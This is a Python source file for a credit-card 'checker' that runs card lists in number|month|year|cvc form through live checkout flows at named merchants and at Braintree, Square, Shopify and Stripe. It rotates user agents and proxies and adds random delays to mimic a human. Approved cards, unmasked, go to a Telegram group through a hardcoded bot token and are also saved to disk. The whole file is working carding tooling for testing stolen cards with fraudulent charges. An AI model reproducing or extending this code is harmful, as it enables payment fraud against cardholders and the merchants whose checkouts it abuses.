#!/usr/bin/env python3
"""
Mady VPS Checker v3.0 - EXTENDED VERSION
Branch with additional gateways: Braintree, Square, Shopify

Features:
- All original gateways (1-5)
- NEW: Braintree Gateway (6)
- NEW: Square Gateway (7)
- NEW: Shopify Gateway (8)
- Proxy support
- Rate limiting
- Concurrent checking
- Dynamic nonce scraping
"""

import sys
import os
import time
import requests
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from collections import deque

# Add gateway path
sys.path.insert(0, '100$/100$/')

# Bot Configuration
BOT_TOKEN = "7984658748:AAFLNS52swKHJkh4kWuu3LDgckslaZjyJTY"
GROUP_IDS = ["-1003546431412"]
BOT_CREDIT = "@MissNullMe"

# Proxy Configuration (Add your proxies here)
PROXY_LIST = [
    # Format: "http://user:pass@ip:port" or "http://ip:port"
    # Example:
    # "http://user:pass@proxy1.com:8080",
    # "http://user:pass@proxy2.com:8080",
]

# User Agent Rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
]

# Gateway imports with error handling
GATEWAYS = {}

# Original Gateways (1-5)
try:
    from Charge1 import BlemartCheckout
    GATEWAYS[1] = {
        "name": "Blemart",
        "func": BlemartCheckout,
        "amount": "$4.99",
        "type": "WooCommerce/Stripe",
        "category": "stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 1 (Blemart) not available: {e}")

try:
    from Charge2 import DistrictPeopleCheckout
    GATEWAYS[2] = {
        "name": "District People",
        "func": DistrictPeopleCheckout,
        "amount": "€69.00",
        "type": "WooCommerce/Stripe",
        "category": "stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 2 (District People) not available: {e}")

try:
    from Charge3 import SaintVinsonDonateCheckout
    GATEWAYS[3] = {
        "name": "Saint Vinson",
        "func": SaintVinsonDonateCheckout,
        "amount": "$20.00",
        "type": "GiveWP/Stripe",
        "category": "stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 3 (Saint Vinson) not available: {e}")

try:
    from Charge4 import BGDCheckoutLogic
    GATEWAYS[4] = {
        "name": "BGD Fresh",
        "func": BGDCheckoutLogic,
        "amount": "$6.50",
        "type": "WooCommerce/Stripe",
        "category": "stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 4 (BGD Fresh) not available: {e}")

try:
    from Charge5 import StaleksFloridaCheckoutVNew
    GATEWAYS[5] = {
        "name": "Staleks Florida",
        "func": StaleksFloridaCheckoutVNew,
        "amount": "$0.01",
        "type": "WooCommerce/Sources",
        "category": "stripe"
    }
except ImportError as e:
    print(f"⚠️ Gateway 5 (Staleks) not available: {e}")

# NEW Gateways (6-8)
try:
    from Charge6_Braintree import BraintreeCheckout
    GATEWAYS[6] = {
        "name": "Braintree",
        "func": BraintreeCheckout,
        "amount": "$1.00",
        "type": "Braintree/PayPal",
        "category": "braintree"
    }
except ImportError as e:
    print(f"⚠️ Gateway 6 (Braintree) not available: {e}")

try:
    from Charge7_Square import SquareCheckout
    GATEWAYS[7] = {
        "name": "Square",
        "func": SquareCheckout,
        "amount": "$1.00",
        "type": "Square Payments",
        "category": "square"
    }
except ImportError as e:
    print(f"⚠️ Gateway 7 (Square) not available: {e}")

try:
    from Charge8_Shopify import ShopifyCheckout
    GATEWAYS[8] = {
        "name": "Shopify",
        "func": ShopifyCheckout,
        "amount": "Variable",
        "type": "Shopify/Stripe",
        "category": "shopify"
    }
except ImportError as e:
    print(f"⚠️ Gateway 8 (Shopify) not available: {e}")

try:
    from Charge9_StripeCheckout import StripeCheckoutGateway
    GATEWAYS[9] = {
        "name": "Stripe Checkout",
        "func": StripeCheckoutGateway,
        "amount": "Variable",
        "type": "Stripe Checkout Session",
        "category": "stripe_checkout"
    }
except ImportError as e:
    print(f"⚠️ Gateway 9 (Stripe Checkout) not available: {e}")

# Rate Limiter
class RateLimiter:
    def __init__(self, max_requests=10, time_window=60):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = deque()
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        with self.lock:
            now = time.time()
            
            # Remove old requests
            while self.requests and self.requests[0] < now - self.time_window:
                self.requests.popleft()
            
            # Wait if at limit
            if len(self.requests) >= self.max_requests:
                sleep_time = self.requests[0] + self.time_window - now
                if sleep_time > 0:
                    time.sleep(sleep_time)
            
            self.requests.append(now)

# Stats tracking
class Stats:
    def __init__(self):
        self.approved = 0
        self.declined = 0
        self.errors = 0
        self.threeDS = 0
        self.total = 0
        self.start_time = None
        self.lock = threading.Lock()
        self.approved_cards = []
        self.results_by_gateway = {}
    
    def update(self, status, card=None, gateway_id=None):
        with self.lock:
            if status == "approved":
                self.approved += 1
                if card:
                    self.approved_cards.append(card)
            elif status == "3ds":
                self.threeDS += 1
            elif status == "declined":
                self.declined += 1
            else:
                self.errors += 1
            
            # Track by gateway
            if gateway_id:
                if gateway_id not in self.results_by_gateway:
                    self.results_by_gateway[gateway_id] = {"approved": 0, "declined": 0, "3ds": 0, "error": 0}
                self.results_by_gateway[gateway_id][status if status in ["approved", "declined", "3ds"] else "error"] += 1

stats = Stats()
rate_limiter = RateLimiter(max_requests=30, time_window=60)

def get_random_proxy():
    """Get random proxy from list"""
    if PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {"http": proxy, "https": proxy}
    return None

def get_random_ua():
    """Get random user agent"""
    return random.choice(USER_AGENTS)

def mask_card(card):
    """Mask card number for display"""
    parts = card.split("|")
    if len(parts) >= 1:
        num = parts[0]
        if len(num) > 10:
            masked = num[:6] + "*" * (len(num) - 10) + num[-4:]
        else:
            masked = num[:4] + "****" + num[-4:] if len(num) > 8 else num
        parts[0] = masked
    return "|".join(parts)

def detect_card_brand(card_number):
    """Detect card brand from number"""
    if card_number.startswith('4'):
        return "VISA"
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return "MASTERCARD"
    elif card_number.startswith(('34', '37')):
        return "AMEX"
    elif card_number.startswith('6011'):
        return "DISCOVER"
    elif card_number.startswith('35'):
        return "JCB"
    elif card_number.startswith(('62', '88')):
        return "UNIONPAY"
    else:
        return "UNKNOWN"

def classify_result(result):
    """Classify gateway result into status categories"""
    if isinstance(result, dict):
        # Handle dict responses (like from Charge5)
        if 'error' in result:
            return "error", result.get('error', 'Unknown error')
        result = str(result)
    
    result_lower = result.lower()
    
    # Approved
    if any(kw in result_lower for kw in ['charged', 'success', 'approved', 'payment successful', 'order received']):
        return "approved", result
    
    # 3DS Required
    if any(kw in result_lower for kw in ['3ds', 'action required', 'requires_action', 'authenticate', 'redirect']):
        return "3ds", result
    
    # Declined with specific reasons
    if 'insufficient' in result_lower:
        return "declined", "Insufficient Funds"
    if 'incorrect_cvc' in result_lower or 'security code' in result_lower:
        return "declined", "Incorrect CVC"
    if 'expired' in result_lower:
        return "declined", "Card Expired"
    if 'incorrect_number' in result_lower or 'invalid card' in result_lower:
        return "declined", "Invalid Card Number"
    if 'do not honor' in result_lower:
        return "declined", "Do Not Honor"
    if 'declined' in result_lower:
        return "declined", result
    
    # Error
    if 'error' in result_lower:
        return "error", result
    
    # Default to declined
    return "declined", result

def send_to_telegram(message, silent=True):
    """Send message to Telegram group"""
    success = False
    for group_id in GROUP_IDS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'HTML',
            'disable_notification': silent
        }
        
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                success = True
        except:
            pass
    return success

def check_card_real(card, gateway_id=1, extra_params=None):
    """Check card using real gateway"""
    if gateway_id not in GATEWAYS:
        return "Error: Gateway not available"
    
    gateway = GATEWAYS[gateway_id]
    gateway_func = gateway["func"]
    
    # Apply rate limiting
    rate_limiter.wait_if_needed()
    
    # Add small random delay to mimic human behavior
    time.sleep(random.uniform(0.5, 2.0))
    
    try:
        # Some gateways need extra parameters
        if gateway_id == 8 and extra_params:  # Shopify needs shop URL
            result = gateway_func(card, extra_params.get('shop_url'))
        elif gateway_id == 9 and extra_params:  # Stripe Checkout needs checkout URL
            result = gateway_func(card, extra_params.get('checkout_url'))
        else:
            result = gateway_func(card)
        return result
    except Exception as e:
        return f"Error: {str(e)}"

def process_card(card, index, total, gateway_id, use_real=True, extra_params=None):
    """Process a single card"""
    try:
        card = card.strip()
        if not card or '|' not in card:
            return "error", "Invalid format"
        
        parts = card.split('|')
        if len(parts) != 4:
            return "error", "Invalid format"
        
        card_number = parts[0]
        brand = detect_card_brand(card_number)
        
        # Check card
        if use_real and gateway_id in GATEWAYS:
            result = check_card_real(card, gateway_id, extra_params)
        else:
            # Fallback to simulation if gateway not available
            result = simulate_check(card)
        
        # Classify result
        status, message = classify_result(result)
        
        # Update stats
        stats.update(status, card if status == "approved" else None, gateway_id)
        
        # Handle approved cards
        if status == "approved":
            gateway_name = GATEWAYS.get(gateway_id, {}).get("name", "Unknown")
            gateway_amount = GATEWAYS.get(gateway_id, {}).get("amount", "$?.??")
            gateway_type = GATEWAYS.get(gateway_id, {}).get("type", "Unknown")
            
            # Send to Telegram
            telegram_msg = f"""
✅ <b>APPROVED #{stats.approved}</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Brand:</b> {brand}
<b>Gateway:</b> {gateway_name}
<b>Type:</b> {gateway_type}
<b>Amount:</b> {gateway_amount}
<b>Response:</b> {message}

<b>Progress:</b> {index}/{total}
<b>Bot:</b> {BOT_CREDIT}
"""
            send_to_telegram(telegram_msg, silent=True)
            
            # Terminal output
            print(f"\n{'='*70}")
            print(f"✅ APPROVED [{index}/{total}]")
            print(f"   Card: {card}")
            print(f"   Brand: {brand}")
            print(f"   Gateway: {gateway_name} ({gateway_type})")
            print(f"   Response: {message}")
            print(f"{'='*70}\n")
        
        elif status == "3ds":
            print(f"🔐 [{index}/{total}]: {mask_card(card)} - 3DS Required")
        
        elif status == "declined":
            print(f"❌ [{index}/{total}]: {mask_card(card)} - {message[:50]}")
        
        else:
            print(f"⚠️ [{index}/{total}]: {mask_card(card)} - {message[:50]}")
        
        return status, message
        
    except Exception as e:
        stats.update("error", gateway_id=gateway_id)
        print(f"⚠️ [{index}/{total}]: Error - {str(e)[:50]}")
        return "error", str(e)

def simulate_check(card):
    """Fallback simulation when gateways unavailable"""
    rand = random.random()
    
    if rand < 0.10:
        return "Charged"
    elif rand < 0.15:
        return "3DS Required"
    elif rand < 0.40:
        return "Declined - Insufficient Funds"
    elif rand < 0.60:
        return "Declined - Card Declined"
    elif rand < 0.80:
        return "Declined - Do Not Honor"
    else:
        return "Declined - Generic"

def process_batch(cards, gateway_id=1, threads=5, use_real=True, extra_params=None):
    """Process batch of cards"""
    total = len(cards)
    stats.total = total
    stats.start_time = datetime.now()
    
    gateway_name = GATEWAYS.get(gateway_id, {}).get("name", "Simulation")
    gateway_amount = GATEWAYS.get(gateway_id, {}).get("amount", "N/A")
    gateway_type = GATEWAYS.get(gateway_id, {}).get("type", "Unknown")
    gateway_category = GATEWAYS.get(gateway_id, {}).get("category", "unknown")
    
    print(f"\n{'='*70}")
    print(f"{'MADY VPS CHECKER v3.0 - EXTENDED GATEWAY MODE':^70}")
    print(f"{'='*70}")
    print(f"📋 Total Cards: {total:,}")
    print(f"⚡ Threads: {threads}")
    print(f"🎯 Gateway: {gateway_name} ({gateway_amount})")
    print(f"🔧 Type: {gateway_type}")
    print(f"📦 Category: {gateway_category.upper()}")
    print(f"📡 Telegram: {GROUP_IDS[0]}")
    print(f"🤖 Bot: {BOT_CREDIT}")
    print(f"🔄 Mode: {'REAL' if use_real else 'SIMULATION'}")
    print(f"{'='*70}\n")
    
    # Send start notification
    send_to_telegram(f"""
🚀 <b>VPS CHECKER v3.0 STARTED</b>

<b>Total Cards:</b> {total:,}
<b>Gateway:</b> {gateway_name}
<b>Type:</b> {gateway_type}
<b>Amount:</b> {gateway_amount}
<b>Threads:</b> {threads}
<b>Mode:</b> {'REAL' if use_real else 'SIMULATION'}

<i>Processing in progress...</i>
""", silent=False)
    
    # Process cards
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for i, card in enumerate(cards, 1):
            future = executor.submit(process_card, card, i, total, gateway_id, use_real, extra_params)
            futures.append(future)
            
            # Progress updates every 25 cards
            if i % 25 == 0:
                elapsed = (datetime.now() - stats.start_time).total_seconds()
                rate = i / elapsed if elapsed > 0 else 0
                eta = (total - i) / rate if rate > 0 else 0
                
                with stats.lock:
                    print(f"\n{'='*70}")
                    print(f"📊 PROGRESS: {i:,}/{total:,} ({i/total*100:.1f}%)")
                    print(f"   ✅ Approved: {stats.approved}")
                    print(f"   🔐 3DS: {stats.threeDS}")
                    print(f"   ❌ Declined: {stats.declined}")
                    print(f"   ⚠️ Errors: {stats.errors}")
                    print(f"   ⚡ Speed: {rate:.1f} cards/sec | ETA: {eta:.0f}s")
                    print(f"{'='*70}\n")
    
    # Final statistics
    elapsed = (datetime.now() - stats.start_time).total_seconds()
    
    print(f"\n{'='*70}")
    print(f"{'BATCH PROCESSING COMPLETE':^70}")
    print(f"{'='*70}")
    print(f"📊 FINAL RESULTS:")
    print(f"   Total Processed: {total:,} cards")
    print(f"   ✅ Approved: {stats.approved} ({stats.approved/total*100:.1f}%)")
    print(f"   🔐 3DS Required: {stats.threeDS} ({stats.threeDS/total*100:.1f}%)")
    print(f"   ❌ Declined: {stats.declined} ({stats.declined/total*100:.1f}%)")
    print(f"   ⚠️ Errors: {stats.errors} ({stats.errors/total*100:.1f}%)")
    print(f"\n⏱️ PERFORMANCE:")
    print(f"   Total Time: {elapsed:.1f} seconds")
    print(f"   Average Speed: {total/elapsed:.1f} cards/second")
    print(f"{'='*70}\n")
    
    # Send final report
    send_to_telegram(f"""
🎉 <b>VPS CHECKER v3.0 COMPLETE</b> 🎉

<b>Gateway:</b> {gateway_name}
<b>Type:</b> {gateway_type}
<b>Total Processed:</b> {total:,} cards

<b>📊 Results:</b>
✅ Approved: {stats.approved} ({stats.approved/total*100:.1f}%)
🔐 3DS: {stats.threeDS} ({stats.threeDS/total*100:.1f}%)
❌ Declined: {stats.declined} ({stats.declined/total*100:.1f}%)
⚠️ Errors: {stats.errors} ({stats.errors/total*100:.1f}%)

<b>⚡ Performance:</b>
• Time: {elapsed:.1f} seconds
• Speed: {total/elapsed:.1f} cards/sec

<b>Bot:</b> {BOT_CREDIT}
""", silent=False)
    
    # Return approved cards
    return stats.approved_cards

def show_gateway_menu():
    """Display interactive gateway selection menu"""
    print("\n" + "="*60)
    print("SELECT GATEWAY".center(60))
    print("="*60)
    
    # Group by category
    categories = {
        "stripe": [],
        "braintree": [],
        "square": [],
        "shopify": []
    }
    
    for gw_id, gw_info in GATEWAYS.items():
        cat = gw_info.get("category", "other")
        if cat in categories:
            categories[cat].append((gw_id, gw_info))
    
    # Display by category
    print("\n📦 STRIPE GATEWAYS:")
    for gw_id, gw_info in categories.get("stripe", []):
        print(f"   {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    
    print("\n💳 BRAINTREE GATEWAYS:")
    for gw_id, gw_info in categories.get("braintree", []):
        print(f"   {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    
    print("\n🔲 SQUARE GATEWAYS:")
    for gw_id, gw_info in categories.get("square", []):
        print(f"   {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    
    print("\n🛒 SHOPIFY GATEWAYS:")
    for gw_id, gw_info in categories.get("shopify", []):
        print(f"   {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    
    print("\n" + "="*60)
    
    while True:
        try:
            choice = input("\nEnter gateway number (1-8): ").strip()
            gw_id = int(choice)
            if gw_id in GATEWAYS:
                return gw_id
            else:
                print(f"❌ Gateway {gw_id} not available. Try again.")
        except ValueError:
            print("❌ Please enter a valid number.")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Mady VPS Checker v3.0 - Extended Gateway Support',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mady_vps_checker_v3.py cards.txt
  python3 mady_vps_checker_v3.py cards.txt --gateway 6  # Braintree
  python3 mady_vps_checker_v3.py cards.txt --gateway 7  # Square
  python3 mady_vps_checker_v3.py cards.txt --gateway 8 --shop-url https://example.myshopify.com
  python3 mady_vps_checker_v3.py cards.txt --threads 10 --gateway 1
  python3 mady_vps_checker_v3.py cards.txt --simulate
  python3 mady_vps_checker_v3.py cards.txt --interactive
  
Available Gateways:
  STRIPE:
    1 - Blemart ($4.99)
    2 - District People (€69.00)
    3 - Saint Vinson ($20.00)
    4 - BGD Fresh ($6.50)
    5 - Staleks Florida ($0.01)
  
  NEW GATEWAYS:
    6 - Braintree ($1.00)
    7 - Square ($1.00)
    8 - Shopify (Variable) - Requires --shop-url
        """
    )
    
    parser.add_argument('file', nargs='?', help='Path to card file')
    parser.add_argument('-g', '--gateway', type=int, default=1,
                       help='Gateway ID (1-8, default: 1)')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5, max recommended: 10)')
    parser.add_argument('-l', '--limit', type=int, default=0,
                       help='Limit number of cards (0 = no limit)')
    parser.add_argument('-s', '--simulate', action='store_true',
                       help='Use simulation mode instead of real gateways')
    parser.add_argument('-i', '--interactive', action='store_true',
                       help='Interactive mode - prompts for gateway selection')
    parser.add_argument('--shop-url', type=str, default=None,
                       help='Shopify store URL (required for gateway 8)')
    parser.add_argument('--checkout-url', type=str, default=None,
                       help='Stripe Checkout URL (required for gateway 9)')
    
    args = parser.parse_args()
    
    # Interactive mode
    if args.interactive or not args.file:
        print("\n" + "="*60)
        print("MADY VPS CHECKER v3.0 - INTERACTIVE MODE".center(60))
        print("="*60)
        
        # Get file path
        if not args.file:
            args.file = input("\n📁 Enter card file path: ").strip()
        
        # Check file
        if not os.path.exists(args.file):
            print(f"❌ Error: File not found: {args.file}")
            sys.exit(1)
        
        # Select gateway
        args.gateway = show_gateway_menu()
        
        # Get threads
        try:
            threads_input = input(f"\n⚡ Enter number of threads (default: 5): ").strip()
            args.threads = int(threads_input) if threads_input else 5
        except:
            args.threads = 5
        
        # Shopify needs shop URL
        if args.gateway == 8 and not args.shop_url:
            args.shop_url = input("\n🛒 Enter Shopify store URL: ").strip()
    
    # Check file
    if not args.file or not os.path.exists(args.file):
        print(f"❌ Error: File not found: {args.file}")
        sys.exit(1)
    
    # Check gateway
    if args.gateway not in GATEWAYS and not args.simulate:
        print(f"⚠️ Warning: Gateway {args.gateway} not available, using simulation")
        args.simulate = True
    
    # Shopify validation
    if args.gateway == 8 and not args.shop_url and not args.simulate:
        print("❌ Error: Shopify gateway requires --shop-url parameter")
        sys.exit(1)
    
    # Load cards
    print(f"\n📁 Loading cards from: {args.file}")
    with open(args.file, 'r') as f:
        lines = f.readlines()
    
    cards = [line.strip() for line in lines if line.strip() and '|' in line]
    
    if not cards:
        print("❌ Error: No valid cards found")
        sys.exit(1)
    
    print(f"✅ Loaded {len(cards):,} cards")
    
    # Apply limit
    if args.limit > 0:
        cards = cards[:args.limit]
        print(f"📌 Limited to {len(cards):,} cards")
    
    # Confirm large batches
    if len(cards) > 100 and not args.simulate:
        print(f"\n⚠️ WARNING: Large batch of {len(cards):,} cards with REAL gateway")
        print(f"This may take a while and could trigger rate limits.")
        response = input("Continue? (y/n): ")
        if response.lower() != 'y':
            print("Cancelled.")
            sys.exit(0)
    
    # Prepare extra params
    extra_params = {}
    if args.shop_url:
        extra_params['shop_url'] = args.shop_url
    if args.checkout_url:
        extra_params['checkout_url'] = args.checkout_url
    
    # Process
    try:
        approved = process_batch(
            cards, 
            gateway_id=args.gateway, 
            threads=args.threads,
            use_real=not args.simulate,
            extra_params=extra_params
        )
        
        # Save approved cards
        if approved:
            output_file = f"approved_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(output_file, 'w') as f:
                for card in approved:
                    f.write(card + '\n')
            print(f"\n💾 Approved cards saved to: {output_file}")
            
    except KeyboardInterrupt:
        print(f"\n\n⛔ Interrupted! Processed {stats.approved + stats.declined + stats.errors}/{len(cards)} cards")
        print(f"✅ Approved: {stats.approved} | ❌ Declined: {stats.declined}")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════════════╗
║           MADY VPS CHECKER v3.0 - EXTENDED GATEWAY SUPPORT        ║
║      Braintree | Square | Shopify + Original Stripe Gateways      ║
║                       Bot by @MissNullMe                          ║
╚════════════════════════════════════════════════════════════════════╝
""")
    
    # Show available gateways
    print("Available Gateways:")
    print("-" * 60)
    
    # Group by category
    stripe_gws = [(k, v) for k, v in GATEWAYS.items() if v.get('category') == 'stripe']
    other_gws = [(k, v) for k, v in GATEWAYS.items() if v.get('category') != 'stripe']
    
    if stripe_gws:
        print("\n📦 STRIPE:")
        for gw_id, gw_info in stripe_gws:
            print(f"   {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    
    if other_gws:
        print("\n🆕 NEW GATEWAYS:")
        for gw_id, gw_info in other_gws:
            print(f"   {gw_id}. {gw_info['name']} ({gw_info['amount']}) - {gw_info['type']}")
    
    print()
    
    if len(sys.argv) == 1:
        print("Usage: python3 mady_vps_checker_v3.py <file> [options]")
        print("\nQuick Start:")
        print("  python3 mady_vps_checker_v3.py /home/null/Desktop/TestCards.txt")
        print("  python3 mady_vps_checker_v3.py cards.txt --gateway 6  # Braintree")
        print("  python3 mady_vps_checker_v3.py cards.txt --gateway 7  # Square")
        print("  python3 mady_vps_checker_v3.py cards.txt --interactive")
        print("\nRun with --help for more info")
        sys.exit(0)
    
    main()
